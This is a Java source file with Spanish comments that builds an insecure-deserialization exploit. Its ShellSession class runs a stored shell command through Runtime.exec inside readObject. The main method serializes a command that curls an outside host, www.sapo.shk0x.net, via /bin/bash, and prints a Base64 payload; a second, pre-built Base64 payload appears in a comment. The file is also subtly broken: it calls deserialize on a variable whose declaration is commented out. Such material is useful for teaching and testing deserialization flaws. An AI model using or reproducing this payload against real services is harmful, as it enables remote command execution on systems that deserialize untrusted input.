import java.io.*;
import java.util.Base64;

public class ShellSession implements Serializable {
    private static final long serialVersionUID = 1L;

    private String[] command;

    public ShellSession(String[] command) {
        this.command = command;
    }

    // Ejecuta el comando al deserializar
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }



///////////////////
// SERIALIZE
//////////////////




    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);
        objectStream.writeObject(obj);
        objectStream.close();
        return byteStream.toByteArray();
    }



///////////////////
// DESERIALIZE
//////////////////


    public static void deserialize(String base64Data) throws IOException, ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(base64Data);

        ObjectInputStream objectStream = new ObjectInputStream(new ByteArrayInputStream(data));
        objectStream.readObject();
        objectStream.close();
    }



///////////////////
// MAIN
//////////////////




    public static void main(String[] args) throws IOException, ClassNotFoundException {
        String[] command = {"/bin/bash", "-c", "curl www.sapo.shk0x.net"};

        ShellSession session = new ShellSession(command);

        byte[] serializedData = serialize(session);
        String base64String = Base64.getEncoder().encodeToString(serializedData);
        System.out.println("Objeto serializado en Base64: " + base64String);

        //System.out.println("Deserializando el objeto desde Base64...");
        //String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";
        deserialize(otro);
    }
}
